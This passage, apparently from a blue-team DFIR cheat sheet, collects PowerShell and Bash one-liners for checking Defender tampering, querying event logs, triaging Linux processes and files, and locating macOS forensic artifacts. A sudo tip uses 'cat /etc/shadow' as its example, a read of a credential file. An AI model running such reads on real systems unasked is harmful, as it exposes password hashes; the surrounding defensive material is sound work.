![image](https://user-images.githubusercontent.com/44196051/139851360-8a487f04-ab3b-42d2-a4ee-b95a82b26c06.png)

However, if you have numerous threat alerts, the above command may be messy to query. Let's demonstrate some augmentations we can add to make our hunt easier

```powershell
Get-MpThreatDetection | Format-List threatID, *time, ActionSuccess
#Then, take the ThreatID and drill down further into that one
Get-MpThreat -ThreatID
```

![image](https://user-images.githubusercontent.com/44196051/139851774-66739281-7846-427a-8787-61144c4250c8.png)

#### Trigger Defender Scan

```powershell
Update-MpSignature; Start-MpScan
 
#or full scan
Start-MpScan -ScanType FullScan

#Specify path
Start-MpScan -ScanPath "C:\temp"
```

![image](https://user-images.githubusercontent.com/44196051/139852328-a6514fa7-4719-4c8a-b363-363380ed6ad6.png)

#### Check if Defender has been manipulated
Adversaries enjoy simply turning off / disabling the AV. You can query the status of Defender's various detections

```powershell
Get-MpComputerStatus | fl *enable*
```

![image](https://user-images.githubusercontent.com/44196051/139856086-995aebd2-5cb4-4cb4-b7cb-e3b064ceeddb.png)

Adversaries also enjoy adding exclusions to AVs....however please note that some legitimate tooling and vendors ask that some directories and executables are placed on the exclusion list

```powershell
Get-MpPreference | fl *Exclu*
```
![image](https://user-images.githubusercontent.com/44196051/139859941-bc55d413-2ae9-4b42-9c0f-407a7ee5976e.png)


#### Enable Defender monitoring

If you see some values have been disabled, you can re-enable with the following:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false -verbose
```

![image](https://user-images.githubusercontent.com/44196051/139857435-4c7eded7-983a-4c5c-8580-1bb46493bab0.png)

And get rid of the exclusions the adversary may have gifted themselves

```powershell
Remove-MpPreference -ExclusionProcess 'velociraptor' -ExclusionPath 'C:\Users\IEUser\Pictures' -ExclusionExtension '.pif' -force -verbose
```

![image](https://user-images.githubusercontent.com/44196051/139862599-d7281703-bf6e-4984-83a2-d5ec9cd60e7c.png)

## Log Queries 

<details>
    <summary>section contents</summary>
  
  + [Show Logs](#show-logs)
    - [Overview of what a specific log is up to](#overview-of-what-a-specific-log-is-up-to)
    - [Specifically get the last time a log was written to](#specifically-get-the-last-time-a-log-was-written-to)
    - [Compare the date and time a log was last written to](#compare-the-date-and-time-a-log-was-last-written-to)
    - [Read a log file](#read-a-log-file)
  + [WinRM & WECSVC permissions](#winrm---wecsvc-permissions)
  + [Query Defender](#query-defender)
  + [Usage Log](#usage-log)

</details>

From a security perspective, you probably don't want to query logs on the endpoint itself....endpoints after a malicious event can't be trusted. You're better to focus on the logs that have been forwarded from endpoints and centralised in your SIEM. 

If you REALLY want to query local logs for security-related instances, I can recommend this [awesome repo](https://gist.github.com/exp0se/b57f434c9c34b98f84a2)

I've tended to use these commands to troubleshoot Windows Event Forwarding and other log related stuff.

### Show Logs
Show logs that are actually enabled and whose contents isn't empty.
```powershell
Get-WinEvent -ListLog *|
where-object {$_.IsEnabled -eq "True" -and $_.RecordCount -gt "0"} | 
sort-object -property LogName | 
format-table LogName -autosize -wrap
```
![image](https://user-images.githubusercontent.com/44196051/120351284-a96aee00-c2f7-11eb-906d-a8469175b209.png)


#### Overview of what a specific log is up to
```powershell
Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational | Format-List -Property * 
```
![image](https://user-images.githubusercontent.com/44196051/120352076-547ba780-c2f8-11eb-8fa7-f8b11f4776b1.png)

#### Specifically get the last time a log was written to
```powershell
(Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime 
```
![image](https://user-images.githubusercontent.com/44196051/119979946-81a41f00-bfb3-11eb-8bc0-f2e893440b18.png)

#### Compare the date and time a log was last written to
Checks if the date was written recently, and if so, just print _sysmon working_ if not recent, then print the date last written. I've found sometimes that sometimes sysmon bugs out on a machine, and stops committing to logs. Change the number after `-ge` to be more flexible than the one day it currently compares to

```powershell
$b = (Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational).lastwritetime; 
$a = Get-WinEvent -ListLog Microsoft-Windows-Sysmon/Operational| where-object {(new-timespan $_.LastWriteTime).days -ge 1}; 
if ($a -eq $null){Write-host "sysmon_working"} else {Write-host "$env:computername $b"}
```
![image](https://user-images.githubusercontent.com/44196051/119979908-72bd6c80-bfb3-11eb-9bff-856ebcc01375.png)


### Read a Log File

Again, trusting the logs of an endpoint is a dangerous game. An adversary can evade endpoint logging. It's better to utilise logs that have been taken to a central point, to trust EVENT IDs from Sysmon, or trust [network traffic](#network-traffic) if you have it.

Nonetheless, you can read the EVTX file you are interesting in
```powershell
Get-WinEvent -path "C:\windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx | ft -wrap"

#Advisable to filter by Id to filter out noise
Get-WinEvent -path "C:\windows\System32\Winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" |
? Id -eq '4104' | ft -wrap
#this is an example ID number.
```
![image](https://user-images.githubusercontent.com/44196051/124334232-5dc59180-db8e-11eb-9b4b-d590a4a14452.png)
![image](https://user-images.githubusercontent.com/44196051/124334332-b09f4900-db8e-11eb-9a7e-625a275deee8.png)


### WinRM & WECSVC permissions
Test the permissions of winrm - used to see windows event forwarding working, which uses winrm usually on endpoints and wecsvc account on servers
```cmd
netsh http show urlacl url=http://+:5985/wsman/ && netsh http show urlacl url=https://+:5986/wsman/
``` 
![image](https://user-images.githubusercontent.com/44196051/119980070-ae583680-bfb3-11eb-8da7-51d7e5393599.png)


### Usage Log

These two blogs more or less share how to possibly prove when a C#/.net binary was executed [1](https://bohops.com/2021/03/16/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion/), [2](https://bohops.com/2022/08/22/investigating-net-clr-usage-log-tampering-techniques-for-edr-evasion-part-2/)

The log's contents itself is useless. But, the file name of the log may be telling as it will be named after the binary executed.

A very basic way to query this is
```powershell
gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*", "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*"
```
<img width="1104" alt="image" src="https://user-images.githubusercontent.com/44196051/203795516-2c44e5cb-50b3-42d0-8de1-cecf73ff6bb7.png">

If you wanted to query this network wide, you've got some options:

```powershell

#Show usage log's created after a certain day
  #use american date, probably a way to convert it but meh
gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*",
"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*" | 
where-object {$_.LastWriteTime -gt [datetime]::parse("11/22/2022")} | 
? Name -notmatch Powershell #can ignore and filter some names

# Show usage log but split to focus on the username, executable, and machine name in case you run this network-wide via something like Velociraptor 
(gci "C:\Users\*\AppData\Local\Microsoft\*\UsageLogs\*").fullname | 
ForEach-Object{$data = $_.split("\\");write-output "$($data[8]), $($data[2]), $(hostname)"} | 
Select-String -notmatch "powershell", "NGenTask","sdiagnhost"

#For SYSTEM, you don't need to overcomplicate this
(gci "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\*\UsageLogs\*").name |
ForEach-Object{ write-host "$_, SYSTEM, $(hostname)"}
```
<img width="1143" alt="image" src="https://user-images.githubusercontent.com/44196051/203806975-42340d71-c936-4aa1-bfc6-0d8b3f98e9d1.png">

<img width="1206" alt="image" src="https://user-images.githubusercontent.com/44196051/203807185-bc970a02-9844-4dd5-a9ba-c60660954eda.png">


But keep in mind, an adversary changing the file name is easy and therefore this is a meh telemetry source

<img width="993" alt="image" src="https://user-images.githubusercontent.com/44196051/203811368-18d0f16f-5876-4cf3-bb3d-2a23b2eda4eb.png">

---

## Powershell Tips

<details>
    <summary>section contents</summary>

  + [Get Alias](#get-alias)
  + [Get Command and Get Help](#get-command-and-get-help)
  + [WhatIf](#whatif)
  + [Clip](#clip)
  + [Output Without Headers](#output-without-headers)
  + [Re-run commands](#re-run-commands)
  + [Stop Truncation](#stop-trunction)
    - [Out-String](#out-string)
    - [-Wrap](#-wrap)
  + [Directories](#directories) 
  + [Transcripts](#transcripts)   

</details>

### Get Alias
PwSh is great at abbreviating the commands. Unfortunately, when you're trying to read someone else's abbreviated PwSh it can be ballache to figure out exactly what each weird abbrevation does.

Equally, if you're trying to write something smol and cute you'll want to use abbrevations!

Whatever you're trying, you can use `Get-Alias` to figure all of it out
```powershell
#What does an abbrevation do
get-alias -name gwmi
#What is the abbrevation for this
get-alias -definition write-output
#List all alias' and their full command
get-alias
```
![image](https://user-images.githubusercontent.com/44196051/120551039-81f64d00-c3ed-11eb-8cea-dadb07066942.png)

### Get Command and Get Help
This is similar to `apropos`in Bash. Essentially, you can search for commands related to keywords you give. 

Try to give singulars, not plural. For example, instead of `drivers` just do `driver`

```powershell
get-command *driver* 

## Once you see a particular command or function, to know what THAT does use get-help. 
# get-help [thing]
Get-Help Get-SystemDriver
```

![image](https://user-images.githubusercontent.com/44196051/121262958-d6e20980-c8ac-11eb-8aff-3ad46128da00.png)

![image](https://user-images.githubusercontent.com/44196051/121263587-ba929c80-c8ad-11eb-835b-632b9a6ce47e.png)

### WhatIf
`-WhatIf` is quite a cool flag, as it will tell you what will happen if you run a command. So before you kill a vital process for example, if you include whatif you'll gain some insight into the irreversible future!

```powershell
get-process -name "excel" | stop-process -whatif
```
![image](https://user-images.githubusercontent.com/44196051/121262413-02b0bf80-c8ac-11eb-9448-c76f26aff0df.png)

### Clip
You can pipe straight to your clipboard. Then all you have to do is paste
```powershell
# this will write to terminal
hostname
# this will pipe to clipboard and will NOT write to terminal
hostname | clip
# then paste to test
#ctrl+v
```
![image](https://user-images.githubusercontent.com/44196051/120554093-3e9ddd80-c3f1-11eb-9ddb-d24b8e87481b.png)

### Output Without Headers

You may just want a value without the collumn header that comes. We can do that with `-ExpandProperty`
```powershell
# use the -expandproperty before the object you want. IN this case, ID
 select -ExpandProperty id 
 
# so for example
get-process -Name "google*" | select -ExpandProperty id
# lets stop the particular google ID that we want
$PID =  get-process -Name "google" | ? Path -eq $Null | select -ExpandProperty id;
Stop-Process -ID $PID -Force -Confirm:$false -verbose
```

![image](https://user-images.githubusercontent.com/44196051/121708986-fc9b2880-cacf-11eb-8f4a-e9a4145a9ecd.png)

If you pipe to `| format-table` you can simply use the `-HideTableHeaders` flag

![image](https://user-images.githubusercontent.com/44196051/121710284-5d773080-cad1-11eb-8f2a-1bd27742a199.png)

### Re-run commands
If you had a command that was great, you can re-run it again from your powershell history!
```powershell
##list out history
get-history
#pick the command you want, and then write down the corresponding number
#now invoke history
Invoke-History -id 38

## You can do the alias / abbrevated method for speed
h
r 43
```
![image](https://user-images.githubusercontent.com/44196051/120559078-48770f00-c3f8-11eb-8726-fd7e627df473.png)
![image](https://user-images.githubusercontent.com/44196051/120559222-8f650480-c3f8-11eb-9b84-ef98dc26cb5c.png)


### Stop Trunction
#### Out-String
For reasons(?) powershell truncates stuff, even when it's really unhelpful and pointless for it to do so. Take the below for example: our hash AND path is cut off....WHY?! :rage:

![image](https://user-images.githubusercontent.com/44196051/120917435-3ec70300-c6a7-11eb-8b81-9832cd9c6cb6.png)

To fix this, use `out-string`

```powershell
#put this at the very end of whatever you're running and is getting truncated
| outstring -width 250
# or even more
| outstring -width 4096
#use whatever width number appropiate to print your results without truncation

#you can also stack it with ft. For example: 
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800 
```
Look no elipses!
![image](https://user-images.githubusercontent.com/44196051/120917410-0e7f6480-c6a7-11eb-8546-0a59da8cd181.png)

#### -Wrap
In some places, it doesn't make sense to use out-string as it prints strangely. In these instances, try the `-wrap` function of `format-table`

This, for example is a mess because we used out-string. It's wrapping the final line in an annoying and strange way.
ans
![image](https://user-images.githubusercontent.com/44196051/120917702-88641d80-c6a8-11eb-8f2e-676e2c358546.png)

```powershell
| ft -property * -autosize -wrap 
#you don't always need to the -property * bit. But if you find it isn't printing as you want, try again.
| ft -autosize -wrap 
```

Isn't this much better now?

![image](https://user-images.githubusercontent.com/44196051/120917736-bc3f4300-c6a8-11eb-955e-f876d2e1dd8e.png)

### Directories
For some investigations, I need to organise my directories or everything will get messed up. I enjoy using Year-Month-Date in my directory names!

```powershell
mkdir -p "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")" 

# your working directory for today will be
echo "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")"

##move to the working director
cd "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")"

##save outputs to
echo 'test' > C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")\test.txt
```
![image](https://user-images.githubusercontent.com/44196051/144320196-5a7391f4-be71-4f3b-8397-0a6ffe75abf1.png)
![image](https://user-images.githubusercontent.com/44196051/144320226-ee0f43d5-0c0f-42f1-8d37-393c26b5209a.png)

### Transcripts
Trying to report back what you ran, when you ran, and the results of your commands can become a chore. If you forget a pivotal screenshot, you'll kick yourself - I know I have. 

Instead, we can ask PowerShell to create a log of everything we run and see on the command line.

```powershell
# you can pick whatever path you want, this is just what I tend to use it for
Start-Transcript -path "C:\Malware_Analysis\$(Get-Date -UFormat "%Y_%b_%d_%a_UTC%Z")\PwSh_transcript.log" -noclobber -IncludeInvocationHeader

## At the end of the malware analysis, we will then need to stop all transcripts
Stop-transcript

#you can now open up your Powershell transcript with notepad if you want
```

![image](https://user-images.githubusercontent.com/44196051/144320748-3d567052-9e5d-4472-bf1c-550ad7f05022.png)
![image](https://user-images.githubusercontent.com/44196051/144320852-d1b96c80-04a3-49d5-894f-d4f8c407fee5.png)
![image](https://user-images.githubusercontent.com/44196051/144321157-061038c3-9965-44a9-ba99-6f3426d9765f.png)


---

# Linux
This section is a bit dry, forgive me. My Bash DFIR tends to be a lot more spontaneous and therefore I don't write them down as much as I do the Pwsh one-liners

## Bash History

<details>
    <summary>section contents</summary>
  
  + [Add add timestamps to `.bash_history`](#add-add-timestamps-to--bash-history-)

</details>

Checkout the SANS DFIR talk by Half Pomeraz called [You don't know jack about .bash_history](https://www.youtube.com/watch?v=wv1xqOV2RyE). It's a terrifying insight into how weak bash history really is by default

#### Add add timestamps to `.bash_history`
Via .bashrc
```bash
nano ~/.bashrc
#at the bottom
export HISTTIMEFORMAT='%d/%m/%y %T '
#expand bash history size too

#save and exit
source ~/.bashrc
```
Or by /etc/profile
```bash
nano /etc/profile
export HISTTIMEFORMAT='%d/%m/%y %T '

#save and exit
source /etc/profile
```

![image](https://user-images.githubusercontent.com/44196051/119986667-0abf5400-bfbc-11eb-98cf-17d68042250d.png)

Then run the `history` command to see your timestamped bash history

![image](https://user-images.githubusercontent.com/44196051/119987113-9507b800-bfbc-11eb-8033-064c37f5fe26.png)

---

## Grep and Ack

<details>
    <summary>section contents</summary>

  + [Grep Regex extract IPs](#grep-regex-extract-ipv4)
  + [Use Ack to highlight](#use-ack-to-highlight)
 
</details>

### Grep Regex extract IPs

IPv4
```bash
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt | sort | uniq 
```

IPv6
```bash
egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])) file.txt'
```

##### Stack up IPv4s
Great for parsing 4625s and 4624s in Windows world, and seeing the prelevence of the IPs trying to brute force you. [Did a thread on this](https://twitter.com/Purp1eW0lf/status/1549718394777309187?s=20&t=lxQ1zk-lj7XpxxnonX4P0g)

So for example, this is a txt of all 4654s for an external pereimter server

```bash
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" 4625s.txt | sort | uniq -c | sort -nr
```

<img width="1439" alt="image" src="https://user-images.githubusercontent.com/44196051/180187943-33c9a571-bc20-4a18-83dc-ce2485d7b6a1.png">

To then prepare this to compare to the 4624s, I find it easiest to use this [cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=Extract_IP_addresses(true,false,false,false,false,false)Sort('Line%20feed',false,'Alphabetical%20(case%20sensitive)')Unique('Line%20feed',false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'%7C',true,false,true,false))

![image](https://user-images.githubusercontent.com/44196051/180188486-7c8fe607-f4e1-4a14-bf00-366378eed38d.png)

And now, compare the brute forcing IPs with your 4624 successful logins, to see if any have successfully compromised you

```bash
grep -iEo '192.168.1.114|192.168.1.128|192.168.1.130|192.168.1.146|192.168.1.147|192.168.1.164|192.168.1.3|192.168.1.51|51.89.115.202' 4624s.txt | sort | uniq -c | sort -nr
```


### Use Ack to highlight
One thing I really like about Ack is that it can highlight words easily, which is great for screenshots and reporting. So take the above example, let's say we're looking for two specific IP, we can have ack filter and highlight those

[Ack](https://linux.die.net/man/1/ack) is like Grep's younger, more refined brother. Has some of greps' flags as default, and just makes life a bit easier.

```bash
#install ack if you need to: sudo apt-get install ack
ack -i '127.0.0.1|1.1.1.1' --passthru file.txt
```
![image](https://user-images.githubusercontent.com/44196051/120458382-24331800-c38f-11eb-9527-4c6682be2f5c.png)

---

## Processes and Networks

<details>
    <summary>section contents</summary>

  + [Track parent-child processes easier](#track-parent-child-processes-easier)
  + [Get a quick overview of network activity](#get-a-quick-overview-of-network-activity)
  
</details>

### Track parent-child processes easier
```bash
ps -aux --forest
```
![image](https://user-images.githubusercontent.com/44196051/120000069-54af3680-bfca-11eb-91a8-221562914878.png)


Get an overview of every running process running from a non-standard path

```bash
sudo ls -l /proc/[0-9]*/exe 2>/dev/null | awk '/ -> / && !/\/usr\/(lib(exec)?|s?bin)\// {print $9, $10, $11}' | sed 's,/proc/\([0-9]*\)/exe,\1,'
```
![image](https://user-images.githubusercontent.com/44196051/148913737-97c623e9-23af-431c-8504-56124af8817b.png)

Or list every process full stop

```bash
sudo ls -l /proc/[0-9]*/exe 2>/dev/null | awk '/ -> / {print $NF}' | sort | tac
```
![image](https://user-images.githubusercontent.com/44196051/148913919-69afd3a6-3a1f-49d0-a559-50b93a67875e.png)


### Get a quick overview of network activity
```bash
netstat -plunt
#if you don't have netstat, try ss
ss -plunt
```
![image](https://user-images.githubusercontent.com/44196051/120000196-79a3a980-bfca-11eb-89ed-bbc87b4ca0bc.png)

This alternative also helps re-visualise the originating command and user that a network connection belongs to

```bash
sudo lsof -i
```

![2021-12-01_09-18](https://user-images.githubusercontent.com/44196051/144206571-0c8d1f29-fddc-4349-b932-2ee2eb43e347.png)

---

## Files

<details>
    <summary>section contents</summary>

  + [Recursively look for particular file types, and once you find the files get their hashes](#recursively-look-for-particular-file-types--and-once-you-find-the-files-get-their-hashes-1)
  + [Tree](#tree)
    - [Tree and show the users who own the files and directories](#tree-and-show-the-users-who-own-the-files-and-directories)
  + [Get information about a file](#get-information-about-a-file)
  + [Files and Dates](#files-and-dates)
    - [This one will print the files and their corresponding timestamp](#this-one-will-print-the-files-and-their-corresponding-timestamp)
    - [Show all files created between two dates](#show-all-files-created-between-two-dates)
  + [Compare Files](#compare-files)

</details>


### Recursively look for particular file types, and once you find the files get their hashes
Here's the bash alternative
```bash
find . type f -exec sha256sum {} \; 2> /dev/null | grep -Ei '.asp|.js' | sort
```
![image](https://user-images.githubusercontent.com/44196051/120331789-0cec2000-c2e6-11eb-9617-129c9948666b.png)

### Tree
`Tree` is an amazing command. Please bask in its glory. It will recursively list out folders and filders in their parent-child relationship.....or tree-branch relationship I suppose?

```bash
#install sudo apt-get install tree
tree 
```

![image](https://user-images.githubusercontent.com/44196051/120555193-9f79e580-c3f2-11eb-99e4-bf23930e2e54.png)

But WAIT! There's more!

#### Tree and show the users who own the files and directories
```bash
tree -u
#stack this with a grep to find a particular user you're looking for
tree -u | grep 'root'
```
![image](https://user-images.githubusercontent.com/44196051/120555360-de0fa000-c3f2-11eb-8670-fdc522d03418.png)
![image](https://user-images.githubusercontent.com/44196051/120555562-27f88600-c3f3-11eb-891a-98bf39b5cd71.png)

If you find it a bit long and confusing to track which file belongs to what directory, this flag on tree will print the fullpath
```bash
tree -F
# pipe with | grep 'reports' to highlight a directory or file you are looking for
```
![image](https://user-images.githubusercontent.com/44196051/120661487-3c369480-c480-11eb-8103-fda15e2cbec4.png)

### Get information about a file
`stat` is a great command to get lots of information about a file
 ```bash
stat file.txt
```
![image](https://user-images.githubusercontent.com/44196051/120663875-57a29f00-c482-11eb-8ce9-b4738ce6017a.png)

### Files and Dates
Be careful with this, as timestamps can be manipulated and can't be trusted during an IR

#### This one will print the files and their corresponding timestamp
```bash
find . -printf "%T+ %p\n"
```
![image](https://user-images.githubusercontent.com/44196051/120664233-acdeb080-c482-11eb-8a85-922965bd575e.png)

#### Show all files created between two dates
I've got to be honest with you, this is one of my favourite commands. The level of granularity you can get is crazy. You can find files that have changed state by the MINUTE if you really wanted.

```bash
find -newerct "01 Jun 2021 18:30:00" ! -newerct "03 Jun 2021 19:00:00" -ls | sort
```
![image](https://user-images.githubusercontent.com/44196051/120664969-460dc700-c483-11eb-8c1b-a2223549a97f.png)

### Compare Files

`vimdiff` is my favourite way to compare two files
```bash
vimdiff file1.txt file2.txt
```

The colours highlight differences between the two. When you're done, use vim's method of exiting on both files: `:q!`. Do this twice

![image](https://user-images.githubusercontent.com/44196051/123003853-b71e0b80-d3ab-11eb-8b9e-7e25f8f7a695.png)

`diff` is the lamer, tamer version of `vimdiff`. However it does have some flags for quick analysis:

```bash
#are these files different yes or no?
diff -q net.txt net2.txt

#quickly show minimal differences
diff -d net.txt net2.txt
```
![image](https://user-images.githubusercontent.com/44196051/123004215-37447100-d3ac-11eb-80e9-7f19168e022a.png)


---


## Bash Tips

<details>
    <summary>section contents</summary>

  + [Fixing Mistakes](#fixing-mistakes)
    - [Forget to run as sudo?](#forget-to-run-as-sudo-)
    - [Typos in a big old one liner?](#typos-in-a-big-old-one-liner-)
    - [Re-run a command in History](#re-run-a-command-in-history)

</details>

### Fixing Mistakes
We all make mistakes, don't worry. Bash forgives you

#### Forget to run as sudo?
We've all done it mate. Luckily, `!!` has your back. The exclamation mark is a history related bash thing. 

Using two exclamations, we can return our previous command. By prefixing `sudo` we are bringing our command back but running it as sudo

```bash
#for testing, fuck up a command that needed sudo but you forgot
cat /etc/shadow
# fix it!
sudo !!
```
![image](https://user-images.githubusercontent.com/44196051/120555899-abb27280-c3f3-11eb-8807-f65b74373ad9.png)

#### Typos in a big old one liner?
The `fc` command is interesting. It gets what was just run in terminal, and puts it in a text editor environment. You can the ammend whatever mistakes you may have made. Then if you save and exit, it will execute your newly ammended command

```bash
##messed up command
cat /etc/prozile
#fix it
fc
#then save and exit
```
![image](https://user-images.githubusercontent.com/44196051/120556440-69d5fc00-c3f4-11eb-98ba-ca1c6ac9d8b5.png)
![image](https://user-images.githubusercontent.com/44196051/120556467-70647380-c3f4-11eb-98a1-4f0dd2fef693.png)

#### Re-run a command in History
If you had a beautiful command you ran ages ago, but can't remember it, you can utilise `history`. But don't copy and paste like a chump. 

Instead, utilise exclamation marks and the corresponding number entry for your command in the history file. This is highlighted in red below

```bash
#bring up your History
history
#pick a command you want to re-run.
# now put one exclamation mark, and the corresponding number for the command you want
!12
```
![image](https://user-images.githubusercontent.com/44196051/120556698-c3d6c180-c3f4-11eb-967d-c5ff873ebb56.png)

---

# macOS


<details>
    <summary>section contents</summary>
  
  + [Reading .plist files](#Reading-.plist-files) 
  + [Quarantine Events](#Quarantine-Events) 
  + [Install History](Install-History) 
  + [Most Recently Used (MRU)](#Most-Recently-Used-(MRU)) 
  + [Audit Logs](#Audit-Logs) 
  + [Command line history](#Command-line-history) 
  + [WHOMST is in the Admin group](#WHOMST-is-in-the-Admin-group) 
  + [Persistence locations](#Persistence-locations) 
  + [Transparency, Consent, and Control (TCC)](#Transparency,-Consent,-and-Control-(TCC)) 
  + [Built-In Security Mechanisms](#Built-In-Security-Mechanisms) 


</details>

## Reading .plist files

Correct way to just read a plist is `plutil -p` but there are multiple different methods so do whatever, I’m not the plist police
![image](https://user-images.githubusercontent.com/44196051/170064469-6cfd5350-3049-463e-9272-3062847731fb.png)

If the plist is in binary format, you can convert it to a more readable xml: `plutil -convert xml1 <path_to_binary_plist>`

## Quarantine Events

Files downloaded from the internet 

The db you want to retrieve will be located here with a corresponding username: `/Users/*/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`

Here’s a dope one-liner that organises the application that did the downloading, the link to download, and then the date it was downloaded, via sqlite

```bash
sqlite3 /Users/dray/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 \
'select LSQuarantineAgentName, LSQuarantineDataURLString, date(LSQuarantineTimeStamp + 978307200, "unixepoch") as downloadedDate from LSQuarantineEvent order by LSQuarantineTimeStamp' \
| sort -u | grep '|' --color
```

![image](https://user-images.githubusercontent.com/44196051/170064768-80670c63-8d02-4b19-9315-d79cf017e0ea.png)


## Install History

Find installed applications and the time they were installed from : `/Library/Receipts/InstallHistory.plist`

Annoyingly doesn’t show corresponding user ? However, it does auto sort the list by datetime which is helpful  

```bash
plutil -p /Library/Receipts/InstallHistory.plist
````

![image](https://user-images.githubusercontent.com/44196051/170064859-89c0f488-d314-41d4-8633-a264e5282695.png)


## Location Tracking

Some malware can do creeper stuff and leverage location tracking
Things you see here offer an insight into the programs and services allowed to leverage location stuff on mac


```bash
#plain read
sudo plutil -p /var/db/locationd/clients.plist 

#highlight the path of these applications
sudo plutil -p /var/db/locationd/clients.plist | ack --passthru 'BundlePath'
# or sudo plutil -p /var/db/locationd/clients.plist | grep 'BundlePath'
```

![image](https://user-images.githubusercontent.com/44196051/170064981-582934c5-80b7-4eab-ac2c-69567c47ee72.png)
![image](https://user-images.githubusercontent.com/44196051/170065005-768bce2f-b20e-4915-a687-d07dc44cce39.png)

## Most Recently Used (MRU)

Does what it says…..identifies stuff most recently used 

The directory with all the good stuff is here
```
/Users/*/Library/Application Support/com.apple.sharedfilelist/

#full path to this stuff
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments 
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteItems.sfl2   
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.FavoriteVolumes.sfl2   
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ProjectsItems.sfl2   
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentApplications.sfl2
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.iCloudItems.sfl2
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentServers.sfl2
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentHosts.sfl2
/Users/*/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments.sfl2
```
![image](https://user-images.githubusercontent.com/44196051/170065273-978478c6-106b-4005-9326-d2f647c11524.png)

Another useful subdirectory here containing stuff relevant to recent applicatioons

```
/Users/users/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.ApplicationRecentDocuments/
```

![image](https://user-images.githubusercontent.com/44196051/170065301-69717aa6-e325-4266-8f63-aa94eb0a5d58.png)

There are legitimate ways to parse whats going on here……but that just ain’t me chief - I strings these bad boys

![image](https://user-images.githubusercontent.com/44196051/170065397-a7100299-5125-4d87-ab18-9993129997a0.png)
![image](https://user-images.githubusercontent.com/44196051/170065426-5aacaf50-46b3-494f-ba84-9d7cc708fd75.png)


## Audit Logs

`praudit` command line tool will let you read the audit logs in `/private/var/audit/`
![image](https://user-images.githubusercontent.com/44196051/170065504-e562f241-e9ae-4aa4-b1ae-b5aa8ec9138f.png)

Play around with the different printable formats of `praudit`

![image](https://user-images.githubusercontent.com/44196051/170065543-290890fe-77a2-4c5b-b935-7db0f6ab83d0.png)


And then leverage `auditreduce` to look for specific activity (man page).

### Examples

What was the user dray up to on 13th May 2022: `auditreduce -d 20220513 -u dray /var/audit/* | praudit`
![image](https://user-images.githubusercontent.com/44196051/170065729-9040df83-d245-4024-9b60-6fe656c03da0.png)

Show user logins and outs auditreduce -c lo /var/audit/* | praudit 

![image](https://user-images.githubusercontent.com/44196051/170065772-cea5403b-f402-4d5a-bd04-99d4b6feb80a.png)

What happened between two dates: auditreduce /var/audit/* -a 20220401 -b 20220501 | praudit 

## Safari Notification
